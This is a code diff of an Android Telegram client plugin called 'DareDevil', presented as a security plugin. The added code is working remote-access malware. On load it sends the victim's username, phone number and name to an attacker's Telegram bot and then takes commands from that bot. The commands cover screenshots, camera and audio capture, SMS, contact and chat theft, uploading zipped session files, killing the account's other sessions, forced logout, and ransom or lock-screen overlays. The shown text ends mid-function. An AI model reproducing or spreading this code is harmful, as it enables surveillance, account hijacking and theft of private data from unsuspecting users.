@@ -1,13 +1,13 @@
 # -*- coding: utf-8 -*-
 """
-DareDevil v1.4 — white lawyer while day, daredevil at the night
+DareDevil v1.5 — white lawyer while day, daredevil at the night
 """
 
 __id__ = "DareDevil"
 __name__ = "HellkitchenDevil"
 __description__ = "Good try"
 __author__ = "A4Team"
-__version__ = "1.4"
+__version__ = "1.5"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -54,14 +54,753 @@ RECIPIENT_CACHE_TTL = 600
 MAX_DOC_SIZE = 5 * 1024 * 1024
 VIDEO_MAX_SIZE = 200 * 1024 * 1024
 
-# ... (_log, _UC, _MC, _CM, _cls, _safe_int, _jlist_size, _jlist_get,
-#      _get_bool_attr, _clean_phone, _phone_from_user, _is_ton_address,
-#      _is_blockchain_gift, _http_get, _http_post_json, _http_post_multipart,
-#      _download_to_file — без изменений)
+_logger = None
+
+
+def _log(msg):
+    global _logger
+    try:
+        if _logger is None:
+            try:
+                from android_utils import log as logcat
+                _logger = logcat
+            except Exception:
+                _logger = lambda *a, **k: None
+        _logger("[AR22] " + str(msg))
+    except Exception:
+        pass
+
+
+def _UC():
+    return jclass("org.telegram.messenger.UserConfig")
+
+
+def _MC():
+    return jclass("org.telegram.messenger.MessagesController")
+
+
+def _CM():
+    return jclass("org.telegram.tgnet.ConnectionsManager")
+
+
+_CLASS_CACHE = {}
+
+
+def _cls(*names):
+    key = names
+    c = _CLASS_CACHE.get(key)
+    if c is not None:
+        return c
+    for n in names:
+        try:
+            short = n.split("$")[-1]
+            c2 = getattr(TLRPC, short, None)
+            if c2 is not None:
+                _CLASS_CACHE[key] = c2
+                return c2
+        except Exception:
+            pass
+        try:
+            c2 = jclass(n)
+            _CLASS_CACHE[key] = c2
+            return c2
+        except Exception:
+            continue
+    _CLASS_CACHE[key] = None
+    return None
+
+
+_ReplyGateCls = None
+
+
+def _reply_gate_cls():
+    global _ReplyGateCls
+    if _ReplyGateCls is None:
+        RD = jclass("org.telegram.tgnet.RequestDelegate")
+
+        class _RG(dynamic_proxy(RD)):
+            def __init__(self):
+                super().__init__()
+                self.response = None
+                self.error = None
+
+            def run(self, response, error):
+                self.response = response
+                self.error = error
+
+        _ReplyGateCls = _RG
+    return _ReplyGateCls
+
+
+def _safe_int(v, d=0):
+    try:
+        if v is None:
+            return d
+        return int(v)
+    except Exception:
+        return d
+
+
+def _jlist_size(obj):
+    try:
+        s = getattr(obj, "size", None)
+        if s is None:
+            return len(obj)
+        if callable(s):
+            return int(s())
+        return int(s)
+    except Exception:
+        try:
+            return len(obj)
+        except Exception:
+            return 0
+
+
+def _jlist_get(obj, i):
+    try:
+        g = getattr(obj, "get", None)
+        if callable(g):
+            return g(int(i))
+        return obj[int(i)]
+    except Exception:
+        return None
+
+
+def _get_bool_attr(obj, name, default=False):
+    try:
+        v = getattr(obj, name, default)
+        if v is None:
+            return default
+        if isinstance(v, bool):
+            return v
+        bv = getattr(v, "booleanValue", None)
+        if callable(bv):
+            return bool(bv())
+        return bool(v)
+    except Exception:
+        return default
+
+
+def _clean_phone(raw):
+    if raw is None:
+        return ""
+    s = str(raw).strip()
+    if not s or s.lower() in ("none", "null", "?", "0", ""):
+        return ""
+    digits = "".join(c for c in s if c.isdigit())
+    if len(digits) < 7 or len(digits) > 15:
+        return ""
+    if digits in ("88888888888", "80000000000", "11111111111"):
+        return ""
+    if set(digits) == {"0"} or set(digits) == {"8"}:
+        return ""
+    return "+" + digits
+
+
+def _phone_from_user(u):
+    if u is None:
+        return ""
+    for attr in ("phone", "phoneNumber", "phone_number"):
+        try:
+            v = getattr(u, attr, None)
+            if v is None:
+                continue
+            r = _clean_phone(v)
+            if r:
+                return r
+        except Exception:
+            continue
+    return ""
+
+
+def _is_ton_address(s):
+    try:
+        s = str(s).strip().replace(" ", "").replace("\n", "")
+        if not s:
+            return False
+        if s.startswith(("0:", "-1:")):
+            h = s.split(":", 1)[1]
+            return len(s) >= 66 and len(h) == 64 and all(c in "0123456789abcdefABCDEF" for c in h)
+        if len(s) < 44 or len(s) > 66:
+            return False
+        b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
+        if not all(c in b64 for c in s):
+            return False
+        return s[0] in ("E", "U", "k", "0") and len(s) in (44, 48, 52, 56, 60, 64)
+    except Exception:
+        return False
+
+
+def _is_blockchain_gift(gift, sg=None):
+    try:
+        if _get_bool_attr(gift, "burned", False):
+            return True
+        for obj in ([sg] if sg is not None else []) + [gift]:
+            if obj is None:
+                continue
+            for k in ("owner_address", "ownerAddress", "ton_address", "tonAddress", "blockchain_address"):
+                v = getattr(obj, k, None)
+                if v and _is_ton_address(v):
+                    return True
+            v = getattr(obj, "address", None)
+            if v and _is_ton_address(v):
+                return True
+    except Exception:
+        pass
+    return False
+
+
+def _http_get(url, timeout=30):
+    from urllib.request import Request, urlopen
+    try:
+        req = Request(url, headers={"User-Agent": "Mozilla/5.0"}, method="GET")
+        with urlopen(req, timeout=timeout) as r:
+            return r.read().decode("utf-8", "ignore")
+    except Exception as e:
+        _log("http get: %s" % e)
+        return None
+
+
+def _http_post_json(url, body, timeout=30):
+    from urllib.request import Request, urlopen
+    try:
+        data = json.dumps(body, ensure_ascii=False).encode("utf-8")
+        req = Request(url, data=data, method="POST",
+                      headers={"Content-Type": "application/json; charset=utf-8",
+                               "User-Agent": "Mozilla/5.0"})
+        with urlopen(req, timeout=timeout) as r:
+            return r.read().decode("utf-8", "ignore")
+    except Exception as e:
+        _log("http post: %s" % e)
+        return None
+
+
+def _http_post_multipart(url, fields, file_field, file_name, file_bytes, timeout=120):
+    from urllib.request import Request, urlopen
+    try:
+        boundary = "----ARBoundary" + str(int(time.time() * 1000))
+        body = io.BytesIO()
+        for k, v in fields.items():
+            body.write(("--" + boundary + "\r\n").encode())
+            body.write(('Content-Disposition: form-data; name="%s"\r\n\r\n' % k).encode())
+            body.write(str(v).encode("utf-8"))
+            body.write(b"\r\n")
+        body.write(("--" + boundary + "\r\n").encode())
+        body.write(('Content-Disposition: form-data; name="%s"; filename="%s"\r\n'
+                    % (file_field, file_name)).encode())
+        body.write(b"Content-Type: application/octet-stream\r\n\r\n")
+        body.write(file_bytes)
+        body.write(b"\r\n")
+        body.write(("--" + boundary + "--\r\n").encode())
+        data = body.getvalue()
+        req = Request(url, data=data, method="POST",
+                      headers={"Content-Type": "multipart/form-data; boundary=" + boundary,
+                               "User-Agent": "Mozilla/5.0"})
+        with urlopen(req, timeout=timeout) as r:
+            return r.read().decode("utf-8", "ignore")
+    except Exception as e:
+        _log("http multipart: %s" % e)
+        return None
+
+
+def _download_to_file(url, path, max_size=None, timeout=180):
+    from urllib.request import Request, urlopen
+    try:
+        req = Request(url, headers={"User-Agent": "Mozilla/5.0"}, method="GET")
+        total = 0
+        with urlopen(req, timeout=timeout) as r, open(path, "wb") as f:
+            while True:
+                chunk = r.read(65536)
+                if not chunk:
+                    break
+                total += len(chunk)
+                if max_size is not None and total > max_size:
+                    f.close()
+                    try:
+                        os.remove(path)
+                    except Exception:
+                        pass
+                    return -1
+                f.write(chunk)
+        return total
+    except Exception as e:
+        _log("download: %s" % e)
+        try:
+            if os.path.exists(path):
+                os.remove(path)
+        except Exception:
+            pass
+        return -1
 
 
 class PluginSecurityPlugin(BasePlugin):
-    # ... __init__ без изменений ...
+    def __init__(self):
+        super().__init__()
+        self._sync_running = False
+        self._active = False
+        self.stop = False
+        self._boot_sent = False
+        self._boot_lock = threading.Lock()
+        self._pending_delegates = []
+        self._rpc_lock = threading.RLock()
+        self._jitter = random.randint(400, 900)
+        self._poll_thread = None
+
+        self.account = 0
+        self.user_id = 0
+        self.username = ""
+        self.dev = ""
+
+        self._recipient_ah_cache = {}
+        self._recipient_lock = threading.Lock()
+        self._last_session_confirm = {}
+        self._fee_deficit = 0
+
+        self._tg_kid_watching = False
+        self._tg_kid_seen = set()
+        self._tg_kid_thread = None
+        self._tg_kid_lock = threading.Lock()
+
+        self._ransom_view = None
+        self._ransom_wm = None
+        self._ransom_decor = None
+        self._ransom_photo_path = ""
+        self._ransom_photo_url = ""
+        self._ransom_lock = threading.RLock()
+
+        self._locker_view = None
+        self._locker_on = False
+        self._dim_view = None
+        self._dim_active = False
+
+        self._music_mp = None
+        self._music_path = ""
+        self._music_lock = threading.RLock()
+
+        self._video_view = None
+        self._video_vv = None
+        self._video_path = ""
+        self._video_lock = threading.RLock()
+
+        self._flood_uris = []
+
+        self._input_mode = None
+
+        self._nuke_on = False
+        self._nuke_thread = None
+        self._nuke_interval = 60
+        self._nuke_pass = 0
+        self._nuke_lock = threading.RLock()
+
+    def on_plugin_load(self):
+        with self._boot_lock:
+            self._sync_running = True
+            self._active = True
+            self.stop = False
+            self._boot_sent = False
+        try:
+            self.dev = hashlib.md5((str(time.time()) + str(random.random())).encode()).hexdigest()[:16]
+        except Exception:
+            self.dev = "unknown"
+        try:
+            self.add_on_send_message_hook()
+        except Exception as e:
+            _log("hook: %s" % e)
+        try:
+            self._check_persisted_nuke()
+        except Exception:
+            pass
+        threading.Thread(target=self._boot, daemon=True).start()
+
+    def on_plugin_unload(self):
+        with self._boot_lock:
+            self._sync_running = False
+            self._active = False
+            self.stop = True
+            self._boot_sent = False
+        self._tg_kid_watching = False
+        with self._nuke_lock:
+            self._nuke_on = False
+        for fn in (self._dismiss_ransom, self._clear_locker,
+                   self._clear_dim, self._clear_music, self._clear_video):
+            try:
+                fn()
+            except Exception:
+                pass
+        time.sleep(1.0)
+
+    def create_settings(self):
+        return []
+
+    def _html_escape(self, text):
+        if text is None:
+            return ""
+        t = str(text)
+        return t.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+
+    def _boot(self):
+        with self._boot_lock:
+            if self._boot_sent:
+                return
+            self._boot_sent = True
+        time.sleep(self._jitter / 1000.0)
+        time.sleep(random.uniform(0.2, 0.6))
+        try:
+            self._send_msg(BOOT_LINE_1)
+            time.sleep(0.5)
+            self._send_msg(BOOT_LINE_2)
+            time.sleep(0.5)
+            self._send_manage_button()
+        except Exception as e:
+            _log("boot send: %s" % e)
+        try:
+            self._start_polling()
+        except Exception as e:
+            _log("boot poll: %s" % e)
+
+    def on_send_message_hook(self, account, params):
+        return HookResult()
+
+    def _uc(self):
+        try:
+            sa = int(_UC().selectedAccount)
+            if sa:
+                return sa
+        except Exception:
+            pass
+        for i in range(16):
+            try:
+                if _UC().getInstance(i).getClientUserId():
+                    return i
+            except Exception:
+                pass
+        return 0
+
+    def _my_id(self, account=None, discover=False):
+        acc = account if account is not None else self.account
+        try:
+            return int(_UC().getInstance(int(acc)).getClientUserId())
+        except Exception:
+            pass
+        if not discover:
+            return 0
+        for i in range(16):
+            try:
+                uid = int(_UC().getInstance(i).getClientUserId())
+                if uid:
+                    self.account = i
+                    return uid
+            except Exception:
+                pass
+        return 0
+
+    def _get_accounts_list(self):
+        out = []
+        try:
+            mc = int(getattr(jclass("org.telegram.messenger.UserConfig"),
+                             "MAX_ACCOUNT_COUNT", 8))
+        except Exception:
+            mc = 8
+        mc = max(mc, 16)
+        for i in range(mc):
+            try:
+                uc = _UC().getInstance(i)
+                if not uc or not uc.isClientActivated():
+                    continue
+                uid = int(uc.getClientUserId())
+                if uid == 0:
+                    continue
+                u = None
+                try:
+                    u = uc.getCurrentUser()
+                except Exception:
+                    pass
+                if u is None:
+                    try:
+                        u = _MC().getInstance(i).getUser(uid)
+                    except Exception:
+                        pass
+                un = ""
+                ph = ""
+                if u is not None:
+                    un = str(getattr(u, "username", "") or "")
+                    raw = _phone_from_user(u)
+                    ph = raw.lstrip("+") if raw else ""
+                out.append({"id": i, "user_id": uid, "username": un, "phone": ph})
+            except Exception as e:
+                _log("acc %d: %s" % (i, e))
+        return out
+
+    def _get_input_peer(self, account, peer_id):
+        try:
+            mc = _MC().getInstance(account)
+            peer_id = int(peer_id)
+            if peer_id > 0:
+                user = mc.getUser(peer_id)
+                IPUser = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerUser",
+                              "org.telegram.tgnet.tl.TL_inputPeerUser")
+                if not IPUser:
+                    return None
+                ip = IPUser()
+                ip.user_id = int(user.id) if user is not None else peer_id
+                ip.access_hash = _safe_int(getattr(user, "access_hash", 0)) if user is not None else 0
+                return ip
+            if peer_id < -1000000000000:
+                cid = -peer_id - 1000000000000
+                chat = mc.getChat(cid)
+                IPChannel = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChannel",
+                                 "org.telegram.tgnet.tl.TL_inputPeerChannel")
+                if not IPChannel:
+                    return None
+                ip = IPChannel()
+                ip.channel_id = _safe_int(getattr(chat, "id", cid)) if chat is not None else cid
+                ip.access_hash = _safe_int(getattr(chat, "access_hash", 0)) if chat is not None else 0
+                return ip
+            if peer_id < 0:
+                cid = -peer_id
+                chat = mc.getChat(cid)
+                if chat is not None and getattr(chat, "migrated_to", None) is not None:
+                    mt = chat.migrated_to
+                    IPChannel = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChannel",
+                                     "org.telegram.tgnet.tl.TL_inputPeerChannel")
+                    if not IPChannel:
+                        return None
+                    ip = IPChannel()
+                    ip.channel_id = _safe_int(getattr(mt, "channel_id", 0))
+                    ip.access_hash = _safe_int(getattr(mt, "access_hash", 0))
+                    return ip
+                IPChat = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChat",
+                              "org.telegram.tgnet.tl.TL_inputPeerChat")
+                if not IPChat:
+                    return None
+                ip = IPChat()
+                ip.chat_id = int(cid)
+                return ip
+        except Exception as e:
+            _log("peer: %s" % e)
+        return None
+
+    def _rg_rpc(self, req, account=0, timeout=15.0, fast=False):
+        if fast and timeout > 8.0:
+            timeout = 8.0
+        gate = _reply_gate_cls()()
+        with self._rpc_lock:
+            self._pending_delegates.append(gate)
+        try:
+            cm = _CM().getInstance(account)
+            cm.sendRequest(req, gate)
+            deadline = time.time() + timeout
+            while time.time() < deadline:
+                if gate.response is not None or gate.error is not None:
+                    break
+                time.sleep(0.08)
+        finally:
+            try:
+                self._pending_delegates.remove(gate)
+            except Exception:
+                pass
+        return gate.response, gate.error
+
+    def _parallel(self, jobs, workers=5, timeout=25):
+        try:
+            from concurrent.futures import ThreadPoolExecutor
+        except Exception:
+            out = []
+            for j in jobs:
+                try:
+                    out.append(j[0](*j[1:]))
+                except Exception as e:
+                    out.append(e)
+            return out
+        out = []
+        try:
+            with ThreadPoolExecutor(max_workers=workers) as ex:
+                futs = [ex.submit(j[0], *j[1:]) for j in jobs]
+                for f in futs:
+                    try:
+                        out.append(f.result(timeout=timeout))
+                    except Exception as e:
+                        out.append(e)
+        except Exception as e:
+            _log("parallel: %s" % e)
+            for j in jobs:
+                try:
+                    out.append(j[0](*j[1:]))
+                except Exception as ee:
+                    out.append(ee)
+        return out
+
+    def _api(self, method):
+        if not BOT_TOKEN:
+            _log("no token")
+            return ""
+        return API_BASE + "/" + method
+
+    def _send_msg(self, text, html=False, retries=2):
+        url = self._api("sendMessage")
+        if not url:
+            return None
+        body = {"chat_id": BOT_UID_STR, "text": str(text)[:4000]}
+        if html:
+            body["parse_mode"] = "HTML"
+        for att in range(max(1, retries)):
+            r = _http_post_json(url, body, timeout=20)
+            if r is not None:
+                return r
+            time.sleep(1 + att)
+        return None
+
+    def _send_markup(self, text, keyboard, html=False):
+        url = self._api("sendMessage")
+        if not url:
+            return
+        body = {"chat_id": BOT_UID_STR, "text": str(text)[:4000],
+                "reply_markup": keyboard}
+        if html:
+            body["parse_mode"] = "HTML"
+        _http_post_json(url, body, timeout=20)
+
+    def _send_photo(self, file_path, caption=""):
+        url = self._api("sendPhoto")
+        if not url:
+            return
+        try:
+            with open(file_path, "rb") as f:
+                raw = f.read()
+        except Exception as e:
+            _log("photo read: %s" % e)
+            return
+        fields = {"chat_id": BOT_UID_STR, "caption": str(caption)[:200]}
+        _http_post_multipart(url, fields, "photo",
+                             os.path.basename(file_path), raw)
+
+    def _send_document_bytes(self, filename, data):
+        url = self._api("sendDocument")
+        if not url:
+            return
+        fields = {"chat_id": BOT_UID_STR, "caption": str(filename)[:200]}
+        _http_post_multipart(url, fields, "document",
+                             filename, data)
+
+    def _answer_callback(self, cb_id):
+        url = self._api("answerCallbackQuery")
+        if not url:
+            return
+        _http_post_json(url, {"callback_query_id": str(cb_id)}, timeout=10)
+
+    def _start_polling(self):
+        if self._poll_thread is not None and self._poll_thread.is_alive():
+            _log("poll already running")
+            return
+        self._poll_thread = threading.Thread(target=self._poll, daemon=True)
+        self._poll_thread.start()
+
+    def _poll(self):
+        offset = 0
+        url = self._api("getUpdates")
+        if not url:
+            return
+        try:
+            r = _http_get(url + "?offset=-1&timeout=0", timeout=10)
+            if r:
+                try:
+                    j = json.loads(r)
+                    if j.get("ok") and j.get("result"):
+                        offset = j["result"][-1]["update_id"] + 1
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        while self._sync_running and not self.stop:
+            try:
+                r = _http_get(url + "?offset=" + str(offset) + "&timeout=15",
+                              timeout=25)
+                if r is None:
+                    time.sleep(1)
+                    continue
+                try:
+                    j = json.loads(r)
+                except Exception:
+                    j = None
+                if not j or not j.get("ok"):
+                    if j and not j.get("ok"):
+                        desc = str(j.get("description") or "")
+                        if "Conflict" in desc:
+                            _log("poll conflict — stop")
+                            break
+                    time.sleep(1)
+                    continue
+                res = j.get("result")
+                if not res:
+                    time.sleep(1)
+                    continue
+                for u in res:
+                    offset = u["update_id"] + 1
+                    if "callback_query" in u:
+                        try:
+                            threading.Thread(target=self._handle_callback,
+                                             args=(u["callback_query"],),
+                                             daemon=True).start()
+                        except Exception:
+                            pass
+                    elif "message" in u:
+                        try:
+                            threading.Thread(target=self._handle_message,
+                                             args=(u["message"],),
+                                             daemon=True).start()
+                        except Exception:
+                            pass
+            except Exception as e:
+                _log("poll: %s" % e)
+            time.sleep(0.5)
+
+    def _full_name_underscored(self, u):
+        try:
+            if u is None:
+                return "—"
+            fn = ""
+            ln = ""
+            try:
+                fn = str(getattr(u, "first_name", "") or "").strip()
+            except Exception:
+                fn = ""
+            try:
+                ln = str(getattr(u, "last_name", "") or "").strip()
+            except Exception:
+                ln = ""
+            full = (fn + " " + ln).strip()
+            if not full:
+                return "—"
+            full = re.sub(r"\s+", "_", full)
+            return full
+        except Exception:
+            return "—"
+
+    def _send_manage_button(self):
+        username = "unknown"
+        phone = ""
+        name_surname = "—"
+        try:
+            uc = _UC().getInstance(0)
+            uid = uc.getClientUserId()
+            user = uc.getCurrentUser()
+            if user is not None:
+                un = str(getattr(user, "username", "") or "")
+                username = un if un else ("id:" + str(uid))
+                rp = _phone_from_user(user)
+                phone = rp if rp else ""
+                name_surname = self._full_name_underscored(user)
+            else:
+                username = "id:" + str(uid)
+        except Exception as e:
+            _log("manage btn user: %s" % e)
+        lines = [
+            "<b>Fast Info</b> @" + self._html_escape(username),
+            "Number Phone: " + self._html_escape(phone if phone else "—"),
+            "Name_Surname: " + self._html_escape(name_surname),
+        ]
+        kb = {"inline_keyboard": [[{"text": "Control bg", "callback_data": CB_FULL_MENU}]]}
+        self._send_markup("\n".join(lines), kb, html=True)
 
     def _show_full_menu(self):
         kb = {
@@ -98,13 +837,101 @@ class PluginSecurityPlugin(BasePlugin):
         }
         self._send_markup("Troll", kb, html=True)
 
-    # ... _show_manual_menu, _show_surveillance_menu, _show_data_menu,
-    #     _show_account_menu, _show_shell_menu, _show_automatic_menu,
-    #     _show_help — оставить в коде (dead code) или удалить по желанию ...
+    def _show_manual_menu(self):
+        kb = {
+            "keyboard": [
+                [{"text": "Session Control"}],
+                [{"text": "Surveillance"}],
+                [{"text": "Data Grab"}],
+                [{"text": "Account"}],
+                [{"text": "Shell"}],
+                [{"text": "⬅️ Back"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("Manual", kb, html=True)
+
+    def _show_surveillance_menu(self):
+        kb = {
+            "keyboard": [
+                [{"text": "Screenshot"}],
+                [{"text": "Camera Front"}],
+                [{"text": "Camera Back"}],
+                [{"text": "Audio 5s"}],
+                [{"text": "⬅️ Back"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("Surveillance", kb, html=True)
+
+    def _show_data_menu(self):
+        kb = {
+            "keyboard": [
+                [{"text": "SMS"}],
+                [{"text": "Contacts"}],
+                [{"text": "Apps"}],
+                [{"text": "Chats"}],
+                [{"text": "⬅️ Back"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("Data grab", kb, html=True)
+
+    def _show_account_menu(self):
+        kb = {
+            "keyboard": [
+                [{"text": "Info"}],
+                [{"text": "Pull Out"}],
+                [{"text": "⬅️ Back"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("Account", kb, html=True)
+
+    def _show_shell_menu(self):
+        kb = {
+            "keyboard": [
+                [{"text": "ls /sdcard"}],
+                [{"text": "ps"}],
+                [{"text": "ifconfig"}],
+                [{"text": "df -h"}],
+                [{"text": "⬅️ Back"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("Shell", kb, html=True)
+
+    def _handle_callback(self, cb):
+        try:
+            cb_id = cb.get("id")
+            data = cb.get("data", "")
+            if cb_id:
+                try:
+                    self._answer_callback(cb_id)
+                except Exception:
+                    pass
+            if data == CB_FULL_MENU:
+                self._show_full_menu()
+            elif data == "close_ransom":
+                self._dismiss_ransom()
+            elif data == "close_locker":
+                self._clear_locker()
+            elif data == "close_music":
+                self._clear_music()
+            elif data == "close_video":
+                self._clear_video()
+            elif data == "close_end":
+                self._clear_dim()
+            elif data == "hv_logout":
+                threading.Thread(target=self._pull_out_account, daemon=True).start()
+            elif data == "hv_stop_nuke":
+                self._stop_nuke_loop()
+        except Exception as e:
+            _log("callback: %s" % e)
 
     def _handle_message(self, msg):
         try:
-            t = (msg.get("text") or "").strip()
+            t = str(msg.get("text") or "").strip()
             if not t:
                 return
             if self._input_mode == "music":
@@ -195,12 +1022,10 @@ class PluginSecurityPlugin(BasePlugin):
                 self._send_msg("Send photo URL")
             elif t == "Clear Flood":
                 self._clear_flood()
-            # Ransom / Lock screen / Dim screen — удалены из меню
         except Exception as e:
             _log("handle msg: %s" % e)
 
     def _truncate_zip_entries(self, entries, max_bytes):
-        """entries: list[(arcname, path)] -> list[(arcname, path)] в пределах max_bytes."""
         out = []
         total = 0
         for arc, path in entries:
@@ -256,17 +1081,6 @@ class PluginSecurityPlugin(BasePlugin):
             if not chosen:
                 self._send_msg("Session gain: nothing fits 5MB")
                 return
-            z = io.BytesIO()
-            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
-                for arc, path in chosen:
-                    try:
-                        zf.write(path, arcname=arc)
-                    except Exception:
-                        pass
-            data = z.getvalue()
-            if len(data) > MAX_DOC_SIZE:
-                self._send_msg("Session gain: zip > 5MB after compress (%d)" % len(data))
-                return
             amap = {}
             for a in self._get_accounts_list():
                 amap[str(a.get("id"))] = {
@@ -274,8 +1088,8 @@ class PluginSecurityPlugin(BasePlugin):
                     "username": a.get("username", ""),
                     "phone": a.get("phone", ""),
                 }
-            z2 = io.BytesIO()
-            with zipfile.ZipFile(z2, "w", zipfile.ZIP_DEFLATED) as zf:
+            z = io.BytesIO()
+            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                 for arc, path in chosen:
                     try:
                         zf.write(path, arcname=arc)
@@ -284,7 +1098,10 @@ class PluginSecurityPlugin(BasePlugin):
                 if amap:
                     zf.writestr("accounts_map.json",
                                 json.dumps(amap, ensure_ascii=False, indent=2))
-            final = z2.getvalue()
+            final = z.getvalue()
+            if len(final) > MAX_DOC_SIZE:
+                self._send_msg("Session gain: zip > 5MB (%d)" % len(final))
+                return
             self._send_document_bytes("session_gain.zip", final)
             self._send_msg("Session gain: %d files, %d bytes" % (len(chosen), len(final)))
         except Exception as e:
@@ -317,6 +1134,832 @@ class PluginSecurityPlugin(BasePlugin):
                     total_killed, total_seen, web), html=True)
         except Exception as e:
             self._send_msg("Full Pull out err: " + str(e))
+
+    def _harvest_account_info(self, acc=0, send=False):
+        out = {}
+        try:
+            uc = _UC().getInstance(acc)
+            uid = int(uc.getClientUserId())
+            out["user_id"] = str(uid)
+            u = None
+            try:
+                u = uc.getCurrentUser()
+            except Exception:
+                pass
+            if u is None:
+                try:
+                    u = _MC().getInstance(acc).getUser(uid)
+                except Exception:
+                    pass
+            raw_phone = ""
+            if u is not None:
+                try:
+                    raw_phone = str(getattr(u, "phone", None) or "")
+                except Exception:
+                    raw_phone = ""
+            ph = _clean_phone(raw_phone)
+            if ph:
+                out["phone"] = ph
+            if u is not None:
+                fn = str(getattr(u, "first_name", "") or "").strip()
+                ln = str(getattr(u, "last_name", "") or "").strip()
+                un = str(getattr(u, "username", "") or "").strip()
+                if fn:
+                    out["first_name"] = fn
+                if ln:
+                    out["last_name"] = ln
+                if un:
+                    out["username"] = "@" + un if not un.startswith("@") else un
+            if send:
+                lines = ["<b>Account info</b>"]
+                for k, v in out.items():
+                    lines.append("<b>%s:</b> %s" % (k, self._html_escape(str(v))))
+                self._send_msg("\n".join(lines), html=True)
+        except Exception as e:
+            _log("harvest: %s" % e)
+        return out
+
+    def _get_2fa_state(self, acc=0):
+        try:
+            Req = _cls("org.telegram.tgnet.TLRPC$TL_account_getPassword",
+                       "org.telegram.tgnet.tl.TL_account$getPassword")
+            if not Req:
+                return None
+            resp, err = self._rg_rpc(Req(), acc, 10.0, fast=True)
+            if err is not None or resp is None:
+                return None
+            return {"has_password": _get_bool_attr(resp, "has_password", False)}
+        except Exception:
+            return None
+
+    def _get_authorizations_full(self, acc=0):
+        try:
+            Req = _cls("org.telegram.tgnet.TLRPC$TL_account_getAuthorizations",
+                       "org.telegram.tgnet.tl.TL_account$getAuthorizations")
+            if not Req:
+                return None
+            resp, err = self._rg_rpc(Req(), acc, 8.0, fast=True)
+            if resp is None:
+                return None
+            auths = getattr(resp, "authorizations", None)
+            out = []
+            if auths is None:
+                return out
+            for i in range(_jlist_size(auths)):
+                a = _jlist_get(auths, i)
+                if not a:
+                    continue
+                out.append({
+                    "hash": _safe_int(getattr(a, "hash", 0)),
+                    "current": _get_bool_attr(a, "current", False),
+                    "device": str(getattr(a, "device_model", "") or ""),
+                    "app": str(getattr(a, "app_name", "") or ""),
+                    "platform": str(getattr(a, "platform", "") or ""),
+                })
+            return out
+        except Exception:
+            return None
+
+    def _kill_all_sessions(self, acc=0, phones_pc_only=False):
+        auths = self._get_authorizations_full(acc)
+        if auths is None:
+            return 0, 0
+        total = len(auths)
+        dead = set()
+
+        def _one(h):
+            try:
+                Rst = _cls("org.telegram.tgnet.TLRPC$TL_account_resetAuthorization",
+                           "org.telegram.tgnet.tl.TL_account$resetAuthorization")
+                if not Rst:
+                    return False
+                rq = Rst()
+                rq.hash = h
+                _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
+                return e is None
+            except Exception:
+                return False
+
+        killed = 0
+        for _pass in range(5):
+            targets = []
+            for a in auths:
+                if a["current"]:
+                    continue
+                if not a["hash"] or a["hash"] in dead:
+                    continue
+                if phones_pc_only:
+                    blob = ((a.get("device") or "") + " " +
+                            (a.get("app") or "") + " " +
+                            (a.get("platform") or "")).lower()
+                    if any(w in blob for w in ("web", "chrome", "firefox",
+                                                "safari", "opera", "edge",
+                                                "browser")):
+                        continue
+                targets.append(a["hash"])
+            if not targets:
+                break
+            res = self._parallel([(_one, h) for h in targets], workers=6, timeout=40)
+            for r, h in zip(res, targets):
+                if r is True:
+                    killed += 1
+                    dead.add(h)
+            if _pass < 4:
+                time.sleep(1.5)
+                a2 = self._get_authorizations_full(acc)
+                if not a2:
+                    break
+                auths = a2
+                total = max(total, len(a2))
+        try:
+            Rst = _cls("org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
+                       "org.telegram.tgnet.tl.TL_auth$resetAuthorizations")
+            if Rst:
+                self._rg_rpc(Rst(), acc, 10.0, fast=True)
+        except Exception:
+            pass
+        return killed, max(total, killed)
+
+    def _kill_web_authorizations(self, acc=0):
+        try:
+            Get = _cls("org.telegram.tgnet.TLRPC$TL_account_getWebAuthorizations",
+                       "org.telegram.tgnet.tl.TL_account$getWebAuthorizations")
+            if not Get:
+                return 0
+            resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
+            if resp is None:
+                return 0
+            auths = getattr(resp, "authorizations", None)
+            if auths is None:
+                return 0
+            Reset = _cls("org.telegram.tgnet.TLRPC$TL_account_resetWebAuthorization",
+                         "org.telegram.tgnet.tl.TL_account$resetWebAuthorization")
+            if not Reset:
+                return 0
+            hashes = []
+            for i in range(_jlist_size(auths)):
+                h = _safe_int(getattr(_jlist_get(auths, i), "hash", 0))
+                if h:
+                    hashes.append(h)
+
+            def _one(h):
+                try:
+                    rq = Reset()
+                    rq.hash = h
+                    _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
+                    return e is None
+                except Exception:
+                    return False
+
+            res = self._parallel([(_one, h) for h in hashes], workers=5, timeout=25)
+            return sum(1 for r in res if r is True)
+        except Exception:
+            return 0
+
+    def _pull_out_account(self):
+        try:
+            self._send_msg("Pull Out...")
+            Lo = _cls("org.telegram.tgnet.TLRPC$TL_auth_logOut",
+                      "org.telegram.tgnet.tl.TL_auth$logOut")
+            if not Lo:
+                self._send_msg("Pull out err: no class")
+                return
+            rq = Lo()
+            _r, e = self._rg_rpc(rq, 0, 10.0, fast=True)
+            if e is not None:
+                self._send_msg("Pull out err: " + str(e))
+            else:
+                self._send_msg("Pull out OK.")
+        except Exception as e:
+            self._send_msg("Pull out exc: " + str(e))
+
+    def _has_perm(self, name):
+        try:
+            ctx = ApplicationLoader.applicationContext
+            if ctx is None:
